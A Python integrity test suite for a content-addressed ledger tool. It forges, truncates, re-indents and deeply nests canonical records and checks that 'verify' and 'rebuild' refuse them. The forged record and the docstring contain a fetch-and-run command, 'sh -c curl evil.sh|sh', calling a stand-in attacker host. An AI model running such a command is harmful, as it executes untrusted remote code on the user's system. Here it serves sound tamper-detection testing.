#!/usr/bin/env python3
"""Can the canonical layer be forged without anything noticing?

THE DEFECT (found and fixed 2026-07-30)
---------------------------------------
SPEC §5 ends: "the projection is disposable; the content-addressed causal graph is
the truth." Every reader of that truth used bare `json.loads(path.read_bytes())`
and never recomputed the address, and `oaip verify` did not look at
`.oaip/artifacts` at all — it shelled out to `warrant verify` on the neighbouring
decision store and printed its last line.

Both halves were demonstrated, not argued:

  * an execution record's `command` was rewritten to `sh -c curl evil.sh|sh`,
    `rebuild` printed "rebuilt projection from the canonical layer" and the
    projection then asserted the forged command, while the file still sat under
    its original name;
  * with ALL THREE canonical records forged, `oaip verify` printed
    "verify: 1 records, 0 errors, 1 warnings" and exited 0.

The second is the sharper one, and it is this project's recurring defect class: a
check that examines something ADJACENT to the evidence — a real, healthy,
neighbouring store — and reports that as the health of the thing asked about.

WHY tests/projection_rebuild.py COULD NOT CATCH IT
-------------------------------------------------
That test only ever rebuilds from an HONEST artifact directory, so it exercised
the path where every address happens to match. Same lesson the three-way verify
test records: a clean store agreeing proves almost nothing. Integrity is a claim
about the tampered cases, so every case below tampers with something.
"""
import json
import shutil
import sqlite3
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
# SPEC §7.1. Kept as a literal rather than imported so a change to the
# implementation's own table cannot silently redefine what this test looks at.
TYPE_TAGS = {"artifact", "attribution", "claim", "claim_subject", "effect",
             "environment_probe", "execution", "intent", "state",
             "toolchain_probe"}
ok = True


def case(name, cond, detail=""):
    global ok
    print(("OK   " if cond else "FAIL "), name, detail if not cond else "")
    ok &= bool(cond)


class Ledger:
    """A real ledger in a throwaway git repo, rebuilt fresh for each case."""

    def __init__(self, tmp):
        self.dir = Path(tmp)
        shutil.copytree(ROOT / "impl", self.dir / "impl")
        subprocess.run(["git", "init", "-q", "."], cwd=self.dir, check=True)
        subprocess.run(["git", "-c", "user.email=t@t", "-c", "user.name=t",
                        "commit", "-q", "--allow-empty", "-m", "init"],
                       cwd=self.dir, check=True)
        self.run("init")
        r = self.run("do", "--intent", "add a file", "--check", "test -f f.txt",
                     "--actor", "tester@local", "--", "sh", "-c",
                     "echo hi >> f.txt")
        if "ACCEPTED" not in r.stdout:
            raise SystemExit(f"setup failed: {r.stdout}{r.stderr}")

    def run(self, *a):
        return subprocess.run([sys.executable, "impl/oaip.py", *a],
                              cwd=self.dir, capture_output=True, text=True)

    @property
    def artifacts(self):
        return sorted((self.dir / ".oaip" / "artifacts").glob("*"))

    def records(self, kind=None):
        out = []
        for p in self.artifacts:
            try:
                d = json.loads(p.read_bytes())
            except Exception:
                continue
            # Records are identified the way SPEC §1.1 says: by a member name
            # that is a registered type tag. `"oaip_record" in d` was the
            # pre-0.1 shape, and this helper looking for it is why the whole
            # test file kept passing while the writer changed underneath it.
            if not isinstance(d, dict):
                continue
            tags = [k for k in d if k in TYPE_TAGS]
            if len(tags) == 1 and (kind is None or tags[0] == kind):
                out.append((p, d))
        return out

    def command_in_projection(self):
        """The invocation the PROJECTION asserts, rendered as the record holds
        it: an argv array (§2.4), not a space-joined string."""
        db = self.dir / ".oaip" / "ledger.db"
        if not db.is_file():
            return None
        con = sqlite3.connect(db)
        row = con.execute("SELECT invocation FROM executions").fetchone()
        con.close()
        return json.loads(row[0]) if row else None


def with_ledger(fn):
    with tempfile.TemporaryDirectory() as tmp:
        fn(Ledger(Path(tmp) / "w"))


def main():
    # --- the negative control, first. A check that fires on a healthy ledger is
    # not an integrity check, it is noise, and every case below would be
    # meaningless if this one failed.
    def clean(L):
        v = L.run("verify")
        case("clean ledger: verify passes", v.returncode == 0, v.stdout + v.stderr)
        case("clean ledger: verify actually looked at the canonical layer",
             "canonical layer" in v.stdout, v.stdout)
        # SPEC §2.2.4: three outcomes, and `unreproducible` must never be
        # collapsed into `matched`. Reporting NO outcome is that collapse with
        # the middle step left out — a reader saw "every artifact matches its
        # address" with nothing saying the environment behind those records was
        # never checked.
        case("clean ledger: the fingerprints get a §2.2.4 outcome, on the "
             "record, not silence",
             "fingerprints:" in v.stdout and "matched" in v.stdout, v.stdout)
        case("clean ledger: on the host that wrote them, they MATCH",
             "2 matched, 0 mismatched" in v.stdout, v.stdout)
        # And a State the current environment cannot reproduce is `mismatched`,
        # never an error: environments change, and a State says what was
        # observed then.
        con = sqlite3.connect(L.dir / ".oaip" / "ledger.db")
        con.execute("UPDATE states SET env_fingerprint=? WHERE id IN "
                    "(SELECT id FROM states LIMIT 1)", ("f" * 64,))
        con.commit()
        con.close()
        v2 = L.run("verify")
        case("a State the environment no longer reproduces is MISMATCHED",
             "1 matched, 1 mismatched" in v2.stdout, v2.stdout)
        case("...and a mismatch is reported, not treated as tampering",
             v2.returncode == 0 and "not evidence of tampering" in v2.stdout,
             v2.stdout)
        L.run("rebuild")            # put the projection back before the rest
        r = L.run("rebuild")
        case("clean ledger: rebuild succeeds", r.returncode == 0, r.stdout + r.stderr)
    with_ledger(clean)

    # --- the SHAPE, at an impeccable address. Canonicalization and address are
    # both perfect; only the record's shape is wrong. Until SPEC §2 became a
    # schema this repository could check, this artifact was indistinguishable
    # from an honest one to every reader here — which is how the reference
    # implementation wrote a different record from the specification for every
    # type in it, for its whole life, with `verify` reporting no errors.
    def bad_shape(L):
        import hashlib
        p, d = L.records("attribution")[0]
        # §7.6: `exclusive-command-window` is capped at 999999, because an
        # observer that started one process cannot exclude a writer it did not
        # start. 1000000 is certainty, and this method may not claim it.
        d["confidence_ppm"] = 1000000
        raw = json.dumps(d, sort_keys=True, separators=(",", ":"),
                         ensure_ascii=False).encode()
        p.unlink()
        (p.parent / hashlib.sha256(raw).hexdigest()).write_bytes(raw)

        v = L.run("verify")
        out = v.stdout + v.stderr
        # BOTH halves name the SHAPE finding, because `verify` also fails here
        # for an unrelated reason — the renamed artifact leaves a dangling
        # citation in the projection — and a case that a second defect can
        # satisfy is a case that proves nothing about the first.
        case("a record whose SHAPE is invalid at a valid address: verify fails "
             "and says the shape is why",
             v.returncode != 0 and "not valid under SPEC" in out, out[-400:])
        case("...and the diagnosis names the rule, not the bytes",
             "ceiling" in out, out[-400:])
        r = L.run("rebuild")
        rout = r.stdout + r.stderr
        case("...and rebuild REFUSES rather than projecting it",
             r.returncode != 0 and "refusing to rebuild" in rout, rout[-400:])

        # A record from the FUTURE is the other half of the same rule (§6.2): it
        # must NOT be treated as corruption, or a forward-compatible writer is
        # indistinguishable from an attacker.
        future = json.dumps({"effect": "9.9", "id": "x"},
                            sort_keys=True, separators=(",", ":")).encode()
        (p.parent / hashlib.sha256(future).hexdigest()).write_bytes(future)
        v2 = L.run("verify")
        case("a record at an UNSUPPORTED VERSION is reported, not called corrupt",
             "unsupported-version" in (v2.stdout + v2.stderr),
             (v2.stdout + v2.stderr)[-300:])
    with_ledger(bad_shape)

    # --- the P0 itself: content edited in place, address left alone.
    def forged_command(L):
        p, d = L.records("execution")[0]
        d["invocation"] = ["sh", "-c", "curl evil.sh|sh"]
        p.write_bytes(json.dumps(d, sort_keys=True, separators=(",", ":")).encode())

        v = L.run("verify")
        case("forged execution: verify fails", v.returncode != 0)
        case("forged execution: the error names the address mismatch",
             "does not match its own address" in v.stdout, v.stdout)

        r = L.run("rebuild")
        case("forged execution: rebuild refuses", r.returncode != 0)
        case("forged execution: refusal says why",
             "refusing to rebuild" in (r.stdout + r.stderr), r.stdout + r.stderr)
        # Fail-closed must not mean destroy-first: rebuild deletes the database
        # before writing, so a refusal issued after the delete would have taken
        # the projection with it.
        case("forged execution: the existing projection survived the refusal",
             L.command_in_projection() == ["sh", "-c", "echo hi >> f.txt"],
             f"projection now says {L.command_in_projection()!r}")
    with_ledger(forged_command)

    # --- every record forged: the case where `verify` used to print 0 errors.
    def forged_all(L):
        n = 0
        for p, d in L.records():
            # EVERY record, whatever its type: the first member that is not the
            # type tag gets rewritten. Naming a fixed field list made this case
            # silently cover half the ledger the moment State and probe records
            # appeared — the same "the comparison could not see it" pattern this
            # file exists to catch.
            for f, val in d.items():
                if f in TYPE_TAGS:
                    continue
                d[f] = "FORGED" if isinstance(val, str) else ["FORGED"]
                break
            p.write_bytes(json.dumps(d, sort_keys=True, separators=(",", ":")).encode())
            n += 1
        case("all records forged: there were records to forge", n >= 3, f"n={n}")
        v = L.run("verify")
        case("all records forged: verify fails", v.returncode != 0)
        case("all records forged: every one is reported",
             v.stdout.count("does not match its own address") >= n,
             f"reported {v.stdout.count('does not match its own address')} of {n}")
        # The old behaviour, named so it cannot come back as a "passing" run: the
        # decision layer really is intact here, and that is precisely why
        # reporting it as the verdict was wrong.
        case("all records forged: the decision layer is still reported separately",
             "decision layer" in v.stdout, v.stdout)
    with_ledger(forged_all)

    # --- truncation and appending: integrity is about bytes, not about parseability.
    def truncated(L):
        p, _ = L.records("execution")[0]
        p.write_bytes(p.read_bytes()[:-5])
        v = L.run("verify")
        case("truncated record: verify fails", v.returncode != 0)
        case("truncated record: reported as an address mismatch, not a parse error",
             "does not match its own address" in v.stdout, v.stdout)
    with_ledger(truncated)

    def whitespace_only(L):
        """A byte change that leaves the RECORD identical after parsing. This is
        the case that separates content-addressing from schema validation: the
        document means the same thing, and it is still not that artifact."""
        p, d = L.records("execution")[0]
        p.write_bytes(json.dumps(d, sort_keys=True, indent=2).encode())
        v = L.run("verify")
        case("re-indented record: verify fails though the record is unchanged",
             v.returncode != 0, v.stdout)
    with_ledger(whitespace_only)

    # --- a BOM: bytes Python used to accept silently (RFC 8259 §8.1 "MAY ignore").
    def bom(L):
        p, _ = L.records("execution")[0]
        p.write_bytes(b"\xef\xbb\xbf" + p.read_bytes())
        v = L.run("verify")
        case("BOM-prefixed record: verify fails", v.returncode != 0, v.stdout)
    with_ledger(bom)

    # --- a dangling citation: the projection names evidence that is gone.
    def deleted_artifact(L):
        p, _ = L.records("execution")[0]
        p.unlink()
        v = L.run("verify")
        case("deleted artifact: verify fails", v.returncode != 0)
        case("deleted artifact: reported as an unresolvable citation",
             "not resolvable in the canonical layer" in v.stdout, v.stdout)
    with_ledger(deleted_artifact)

    # --- duplicate member name: valid JSON, outside the declared domain (§1).
    def dup_key(L):
        p, _ = L.records("execution")[0]
        raw = p.read_bytes().decode()
        assert raw.startswith("{"), raw[:20]
        forged = '{"execution":"0.1",' + raw[1:]
        # Written at the address of its own bytes, so the ONLY thing wrong with it
        # is the duplicate member name — otherwise this would just re-test the
        # address check under a different name.
        import hashlib
        p.unlink()
        (p.parent / hashlib.sha256(forged.encode()).hexdigest()).write_bytes(
            forged.encode())
        v = L.run("verify")
        case("duplicate member name at a valid address: verify fails",
             v.returncode != 0, v.stdout)
        case("duplicate member name: reported as a canonicalization failure",
             "not canonical I-JSON" in v.stdout, v.stdout)
    with_ledger(dup_key)

    # --- deep nesting: ~2 KB of brackets, in either half of the canonical layer.
    #
    # F3 (2026-07-30, FOURTH adversarial round). `json.loads` and both I-JSON
    # walkers recurse, so ~1,000 levels raised RecursionError — which no caller
    # catches, since they catch OSError/ValueError. Two things followed, and both
    # are asserted here: the refusal became a TRACEBACK (the fourth instance of
    # the class 1d5d0cb set out to close), and in `rebuild` the crash happened
    # BEFORE `mark_untrusted`, so `oaip log` kept printing "(signed decision)"
    # from a stale projection with no marker — the sticky-projection pattern
    # cb0712f claims to have closed, reopened by 2 KB of "[[[[".
    def deep_nesting_store(L):
        recs = sorted((L.dir / ".oaip" / "warrants" / "records").glob("*.json"))
        case("deep nesting: there is a store record to nest inside", bool(recs))
        if not recs:
            return
        env = json.loads(recs[0].read_text())
        env["deep"] = json.loads("[" * 1000 + "]" * 1000)
        recs[0].write_text(json.dumps(env))
        case("deep nesting: the file is small (this is not a size attack)",
             recs[0].stat().st_size < 8192, recs[0].stat().st_size)

        r = L.run("rebuild")
        out = r.stdout + r.stderr
        case("deeply nested store record: rebuild refuses", r.returncode != 0,
             out[-300:])
        case("deeply nested store record: a sentence, not a traceback",
             "Traceback" not in out and "RecursionError" not in out, out[-500:])
        case("deeply nested store record: the sentence names the depth",
             "nested deeper" in out, out[-500:])
        # The half that made this more than cosmetic.
        case("deeply nested store record: the refusal MARKED the projection "
             "untrusted (it used to crash before that line)",
             (L.dir / ".oaip" / "projection.untrusted").is_file())
        lg = L.run("log")
        case("deeply nested store record: `oaip log` no longer reports the stale "
             "projection as a signed decision",
             lg.returncode != 0 and "(signed decision)" not in lg.stdout,
             (lg.stdout + lg.stderr)[-300:])
        v = L.run("verify")
        case("deeply nested store record: verify says it in a sentence too",
             v.returncode != 0 and "Traceback" not in (v.stdout + v.stderr),
             (v.stdout + v.stderr)[-300:])
    with_ledger(deep_nesting_store)

    def deep_nesting_artifact(L):
        """The same bytes in the artifact half, written AT THE ADDRESS OF THEIR
        OWN BYTES so the only thing wrong with them is the nesting."""
        import hashlib
        forged = json.dumps({"execution": "0.1",
                             "deep": json.loads("[" * 1000 + "]" * 1000)},
                            separators=(",", ":")).encode()
        (L.dir / ".oaip" / "artifacts"
         / hashlib.sha256(forged).hexdigest()).write_bytes(forged)
        v = L.run("verify")
        out = v.stdout + v.stderr
        case("deeply nested artifact at a valid address: verify fails",
             v.returncode != 0, out[-300:])
        case("deeply nested artifact: reported as a canonicalization failure, "
             "not a traceback",
             "not canonical I-JSON" in out and "Traceback" not in out, out[-400:])
        r = L.run("rebuild")
        rout = r.stdout + r.stderr
        case("deeply nested artifact: rebuild refuses in a sentence",
             r.returncode != 0 and "Traceback" not in rout, rout[-400:])
        case("deeply nested artifact: and marks the projection untrusted",
             (L.dir / ".oaip" / "projection.untrusted").is_file())
    with_ledger(deep_nesting_artifact)

    print("\nCANONICAL-LAYER: " + ("ALL PASS" if ok else "FAILURES"))
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
